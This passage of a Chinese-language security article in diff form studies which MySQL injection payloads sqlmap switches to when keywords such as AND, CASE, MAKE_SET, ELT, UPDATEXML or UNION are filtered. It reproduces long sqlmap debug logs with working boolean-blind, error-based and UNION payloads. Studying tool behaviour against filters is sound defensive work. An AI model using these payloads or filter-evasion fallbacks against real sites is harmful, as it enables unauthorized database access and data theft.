+        Payload: id=(CASE WHEN (4416=4416) THEN 1 ELSE 4416*(SELECT 4416 FROM DUAL UNION SELECT 9695 FROM DUAL) END)
+        Vector: (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM DUAL UNION SELECT [RANDNUM1] FROM DUAL) END)
+    ---    
+
+****禁掉AND，CASE**  
+**
+
+sqlmap就会用make_set函数
+
+    
+    
+    [09:08:50] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [09:08:50] [PAYLOAD] MAKE_SET(36=36,1)
+    [09:08:50] [PAYLOAD] MAKE_SET(36=97,1)
+    [09:08:50] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:50] [PAYLOAD] MAKE_SET(97=52,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(52=52,1)
+    [09:08:51] [PAYLOAD] MAKE_SET(97 52,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(47=47,1)
+    [09:08:51] [PAYLOAD] MAKE_SET(47=85,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(85=64,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(64=64,1)
+    [09:08:51] [PAYLOAD] MAKE_SET(85 64,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(59=59,1)
+    [09:08:51] [PAYLOAD] MAKE_SET(59=76,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(76=62,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(62=62,1)
+    [09:08:51] [PAYLOAD] MAKE_SET(76 62,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(13=13,1)
+    [09:08:51] [PAYLOAD] MAKE_SET(13=18,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(18=16,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(16=16,1)
+    [09:08:51] [PAYLOAD] MAKE_SET(18 16,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(78=78,1)
+    [09:08:51] [PAYLOAD] MAKE_SET(78=87,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(87=83,1)
+    [09:08:51] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:51] [PAYLOAD] MAKE_SET(83=83,1)
+    [09:08:52] [PAYLOAD] MAKE_SET(87 83,1)
+    [09:08:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:08:52] [DEBUG] checking for parameter length constrainting mechanisms
+    [09:08:52] [PAYLOAD] MAKE_SET(4909=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                4909,1)
+    [09:08:52] [DEBUG] checking for filtered characters
+    [09:08:52] [PAYLOAD] MAKE_SET((2778)=2778,1)
+    [09:08:52] [PAYLOAD] MAKE_SET(2779>2778,1)
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [09:08:52] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 1542 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: boolean-based blind
+        Title: MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)
+        Payload: id=MAKE_SET(3858=3858,1)
+        Vector: MAKE_SET([INFERENCE],[ORIGVALUE])
+    ---    
+
+****禁掉AND，CASE，MAKE_SET****  
+
+使用ELT函数
+
+    
+    
+    [09:11:52] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [09:11:52] [PAYLOAD] ELT(47=47,1)
+    [09:11:52] [PAYLOAD] ELT(47=95,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(95=75,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(75=75,1)
+    [09:11:52] [PAYLOAD] ELT(95 75,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(73=73,1)
+    [09:11:52] [PAYLOAD] ELT(73=94,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(94=86,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(86=86,1)
+    [09:11:52] [PAYLOAD] ELT(94 86,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(45=45,1)
+    [09:11:52] [PAYLOAD] ELT(45=95,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(95=92,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(92=92,1)
+    [09:11:52] [PAYLOAD] ELT(95 92,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(15=15,1)
+    [09:11:52] [PAYLOAD] ELT(15=91,1)
+    [09:11:52] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:52] [PAYLOAD] ELT(91=84,1)
+    [09:11:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:53] [PAYLOAD] ELT(84=84,1)
+    [09:11:53] [PAYLOAD] ELT(91 84,1)
+    [09:11:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:53] [PAYLOAD] ELT(17=17,1)
+    [09:11:53] [PAYLOAD] ELT(17=74,1)
+    [09:11:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:53] [PAYLOAD] ELT(74=28,1)
+    [09:11:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:53] [PAYLOAD] ELT(28=28,1)
+    [09:11:53] [PAYLOAD] ELT(74 28,1)
+    [09:11:53] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:11:53] [DEBUG] checking for parameter length constrainting mechanisms
+    [09:11:53] [PAYLOAD] ELT(5697=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                5697,1)
+    [09:11:53] [DEBUG] checking for filtered characters
+    [09:11:53] [PAYLOAD] ELT((2220)=2220,1)
+    [09:11:53] [PAYLOAD] ELT(2221>2220,1)
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [09:11:53] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 1530 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: boolean-based blind
+        Title: MySQL boolean-based blind - Parameter replace (ELT - original value)
+        Payload: id=ELT(4348=4348,1)
+        Vector: ELT([INFERENCE],[ORIGVALUE])
+    ---    
+
+****禁掉AND，CASE，MAKE_SET，ELT****  
+
+ ** **直接相乘了****
+
+    
+    
+    [09:16:17] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [09:16:17] [PAYLOAD] (66=66)*1
+    [09:16:17] [PAYLOAD] (66=93)*1
+    [09:16:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:17] [PAYLOAD] (93=90)*1
+    [09:16:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:17] [PAYLOAD] (90=90)*1
+    [09:16:17] [PAYLOAD] (93 90)*1
+    [09:16:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:17] [PAYLOAD] (32=32)*1
+    [09:16:17] [PAYLOAD] (32=44)*1
+    [09:16:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:17] [PAYLOAD] (44=39)*1
+    [09:16:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:17] [PAYLOAD] (39=39)*1
+    [09:16:17] [PAYLOAD] (44 39)*1
+    [09:16:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:17] [PAYLOAD] (54=54)*1
+    [09:16:17] [PAYLOAD] (54=99)*1
+    [09:16:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:17] [PAYLOAD] (99=89)*1
+    [09:16:17] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:18] [PAYLOAD] (89=89)*1
+    [09:16:18] [PAYLOAD] (99 89)*1
+    [09:16:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:18] [PAYLOAD] (29=29)*1
+    [09:16:18] [PAYLOAD] (29=95)*1
+    [09:16:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:18] [PAYLOAD] (95=76)*1
+    [09:16:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:18] [PAYLOAD] (76=76)*1
+    [09:16:18] [PAYLOAD] (95 76)*1
+    [09:16:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:18] [PAYLOAD] (42=42)*1
+    [09:16:18] [PAYLOAD] (42=88)*1
+    [09:16:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:18] [PAYLOAD] (88=74)*1
+    [09:16:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:18] [PAYLOAD] (74=74)*1
+    [09:16:18] [PAYLOAD] (88 74)*1
+    [09:16:18] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:16:18] [DEBUG] checking for parameter length constrainting mechanisms
+    [09:16:18] [PAYLOAD] (6948=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                6948)*1
+    [09:16:18] [DEBUG] checking for filtered characters
+    [09:16:18] [PAYLOAD] ((2671)=2671)*1
+    [09:16:18] [PAYLOAD] (2672>2671)*1
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [09:16:18] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 1518 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: boolean-based blind
+        Title: MySQL boolean-based blind - Parameter replace (bool*int - original value)
+        Payload: id=(9095=9095)*1
+        Vector: ([INFERENCE])*[ORIGVALUE]
+    ---    
+
+****禁掉AND，CASE，MAKE_SET，ELT，*，就会报错****  
+
+#
+![image.png](https://image.3001.net/images/20191228/1577495991_5e06adb77a97e.png!small)
+基于报错型注入（E）
+
+ **默认情况**
+
+    
+    
+    extractvalue() :对XML文档进行查询的函数
+    其实就是相当于我们熟悉的HTML文件中用 <div><p><a>标签查找元素一样
+    语法：extractvalue(目标xml文档，xml路径)
+    第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 /xxx/xxx/xxx/…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。
+    正常查询 第二个参数的位置格式 为 /xxx/xx/xx/xx ,即使查询不到也不会报错
+    select username from security.user where id=1 and (extractvalue(‘anything’,’/x/xx’))
+    
+    
+    
+    [09:22:46] [PAYLOAD] 1 AND EXTRACTVALUE(7450,CONCAT(0x5c,0x7176627171,(SELECT (CASE WHEN (5241=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                5241) THEN 1 ELSE 0 END)),0x71626a6b71))
+    [09:22:46] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:22:46] [DEBUG] performed 1 queries in 0.12 seconds
+    [09:22:46] [DEBUG] checking for filtered characters
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [09:22:46] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 430 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: error-based
+        Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+        Payload: id=1 AND EXTRACTVALUE(4041,CONCAT(0x5c,0x7176627171,(SELECT (ELT(4041=4041,1))),0x71626a6b71))
+        Vector: AND EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+    ---
+ **禁掉 AND，就会使用OR**
+
+    
+    
+    [09:27:36] [PAYLOAD] 1 OR EXTRACTVALUE(6984,CONCAT(0x5c,0x716b7a7171,(SELECT (CASE WHEN (2831=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                2831) THEN 1 ELSE 0 END)),0x717a7a7171))
+    [09:27:36] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:27:36] [DEBUG] performed 1 queries in 0.13 seconds
+    [09:27:36] [DEBUG] checking for filtered characters
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [09:27:36] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 483 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: error-based
+        Title: MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+        Payload: id=1 OR EXTRACTVALUE(9441,CONCAT(0x5c,0x716b7a7171,(SELECT (ELT(9441=9441,1))),0x717a7a7171))
+        Vector: OR EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'))
+    ---
+ **禁掉AND，OR，就会出现updatexml**
+
+    
+    
+    [09:29:23] [PAYLOAD] (UPDATEXML(9878,CONCAT(0x2e,0x7162716b71,(SELECT (CASE WHEN (8893=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                8893) THEN 1 ELSE 0 END)),0x716b6b6271),9352))
+    [09:29:23] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:29:23] [DEBUG] performed 1 queries in 0.16 seconds
+    [09:29:23] [DEBUG] checking for filtered characters
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [09:29:23] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 838 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: error-based
+        Title: MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)
+        Payload: id=(UPDATEXML(6736,CONCAT(0x2e,0x7162716b71,(SELECT (ELT(6736=6736,1))),0x716b6b6271),8672))
+        Vector: (UPDATEXML([RANDNUM],CONCAT('.','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]'),[RANDNUM1]))
+    ---    [09:29:23] [INFO] the back-end DBMS is MySQL
+    back-end DBMS: MySQL >= 5.1
+
+ **禁掉AND，OR， UPDATEXML，就会出现EXTRACTVALUE**
+
+    
+    
+    [09:31:15] [PAYLOAD] (EXTRACTVALUE(1250,CONCAT(0x5c,0x7171627671,(SELECT (CASE WHEN (9342=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9342) THEN 1 ELSE 0 END)),0x716b6b6271)))
+    [09:31:15] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:31:15] [DEBUG] performed 1 queries in 0.18 seconds
+    [09:31:15] [DEBUG] checking for filtered characters
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [09:31:15] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 839 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: error-based
+        Title: MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)
+        Payload: id=(EXTRACTVALUE(3610,CONCAT(0x5c,0x7171627671,(SELECT (ELT(3610=3610,1))),0x716b6b6271)))
+        Vector: (EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')))
+    ---
+ **禁掉AND，OR，UPDATEXML，EXTRACTVALUE，就会失败**  
+
+#
+![image.png](https://image.3001.net/images/20191228/1577496823_5e06b0f75f1fb.png!small)
+联合查询（U）
+
+ **默认情况**
+
+    
+    
+    [09:37:07] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+    [09:37:07] [PAYLOAD] -1466 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (17=17) THEN 1 ELSE 0 END),0x7162717671)-- hZgY
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -6665 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (17=24) THEN 1 ELSE 0 END),0x7162717671)-- YsNa
+    [09:37:07] [DEBUG] performed 1 queries in 0.02 seconds
+    [09:37:07] [PAYLOAD] -4215 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (17=51) THEN 1 ELSE 0 END),0x7162717671)-- ejrD
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -8306 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (51=24) THEN 1 ELSE 0 END),0x7162717671)-- yobT
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -8304 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (24=24) THEN 1 ELSE 0 END),0x7162717671)-- Gyxy
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -4122 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (51 24) THEN 1 ELSE 0 END),0x7162717671)-- zULK
+    [09:37:07] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:37:07] [DEBUG] performed 1 queries in 0.14 seconds
+    [09:37:07] [PAYLOAD] -2502 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (47=47) THEN 1 ELSE 0 END),0x7162717671)-- QCrG
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -9061 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (47=70) THEN 1 ELSE 0 END),0x7162717671)-- SJaU
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -4383 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (47=95) THEN 1 ELSE 0 END),0x7162717671)-- ailf
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -4171 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (95=70) THEN 1 ELSE 0 END),0x7162717671)-- TkVB
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -1142 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (70=70) THEN 1 ELSE 0 END),0x7162717671)-- YlcG
+    [09:37:07] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:07] [PAYLOAD] -8375 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (95 70) THEN 1 ELSE 0 END),0x7162717671)-- Ijdy
+    [09:37:08] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:37:08] [DEBUG] performed 1 queries in 0.15 seconds
+    [09:37:08] [PAYLOAD] -4934 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (25=25) THEN 1 ELSE 0 END),0x7162717671)-- IYqW
+    [09:37:08] [DEBUG] performed 1 queries in 0.02 seconds
+    [09:37:08] [PAYLOAD] -1613 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (25=31) THEN 1 ELSE 0 END),0x7162717671)-- lFQL
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -2297 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (25=63) THEN 1 ELSE 0 END),0x7162717671)-- Koxh
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -3230 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (63=31) THEN 1 ELSE 0 END),0x7162717671)-- DFuT
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -4541 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (31=31) THEN 1 ELSE 0 END),0x7162717671)-- wbyE
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -4571 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (63 31) THEN 1 ELSE 0 END),0x7162717671)-- RoAK
+    [09:37:08] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:37:08] [DEBUG] performed 1 queries in 0.13 seconds
+    [09:37:08] [PAYLOAD] -4255 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (12=12) THEN 1 ELSE 0 END),0x7162717671)-- HeVB
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -2162 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (12=59) THEN 1 ELSE 0 END),0x7162717671)-- UdBM
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -3636 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (12=85) THEN 1 ELSE 0 END),0x7162717671)-- quEm
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -9996 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (85=59) THEN 1 ELSE 0 END),0x7162717671)-- tmiF
+    [09:37:08] [DEBUG] performed 1 queries in 0.03 seconds
+    [09:37:08] [PAYLOAD] -1861 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (59=59) THEN 1 ELSE 0 END),0x7162717671)-- dZZv
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -2005 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (85 59) THEN 1 ELSE 0 END),0x7162717671)-- OulK
+    [09:37:08] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:37:08] [DEBUG] performed 1 queries in 0.11 seconds
+    [09:37:08] [PAYLOAD] -2028 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (26=26) THEN 1 ELSE 0 END),0x7162717671)-- iRZQ
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -2447 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (26=39) THEN 1 ELSE 0 END),0x7162717671)-- IPSM
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -8785 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (26=83) THEN 1 ELSE 0 END),0x7162717671)-- cbzQ
+    [09:37:08] [DEBUG] performed 1 queries in 0.02 seconds
+    [09:37:08] [PAYLOAD] -2637 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (83=39) THEN 1 ELSE 0 END),0x7162717671)-- wwBL
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -8945 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (39=39) THEN 1 ELSE 0 END),0x7162717671)-- qohR
+    [09:37:08] [DEBUG] performed 1 queries in 0.01 seconds
+    [09:37:08] [PAYLOAD] -2184 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (83 39) THEN 1 ELSE 0 END),0x7162717671)-- vJmq
+    [09:37:08] [DEBUG] got HTTP error code: 500 (Internal Server Error)
+    [09:37:08] [DEBUG] performed 1 queries in 0.13 seconds
+    [09:37:08] [DEBUG] checking for parameter length constrainting mechanisms
+    [09:37:08] [PAYLOAD] -6805 UNION ALL SELECT NULL,CONCAT(0x71787a7671,(CASE WHEN (6024=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                6024) THEN 1 ELSE 0 END),0x7162717671)-- aqzt
+    [09:37:08] [DEBUG] performed 1 queries in 0.02 seconds
+    [09:37:08] [DEBUG] checking for filtered characters
+    GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+    [09:37:08] [DEBUG] used the default behaviour, running in batch mode
+    sqlmap identified the following injection point(s) with a total of 87 HTTP(s) requests:
+    ---    Parameter: id (GET)
+        Type: UNION query
+        Title: Generic UNION query (NULL) - 2 columns
+        Payload: id=-1722 UNION ALL SELECT NULL,CONCAT(0x71787a7671,0x417a6144526d48684971744f484c49585966416b4b66736851446c6d53787a63446b41705a715747,0x7162717671)-- Nyot
+        Vector:  UNION ALL SELECT NULL,[QUERY][GENERIC_SQL_COMMENT]
+    ---
+ **禁掉union，就会报错**
+
+**![image.png](https://image.3001.net/images/20191228/1577497137_5e06b231cdeee.png!small)禁掉SELECT，也会报错**
+
+**![image.png](https://image.3001.net/images/20191228/1577497218_5e06b282641e9.png!small)禁掉CONCAT，也会失败**
+
+![image.png](https://image.3001.net/images/20191228/1577497308_5e06b2dcdef81.png!small)
+**禁掉CASE**
+
+**![image.png](https://image.3001.net/images/20191228/1577497503_5e06b39fa1b7c.png!small)栈查询（S）**
+
+ **忽略**
+
+ **内联查询（Q）**
+
+ **忽略**
+
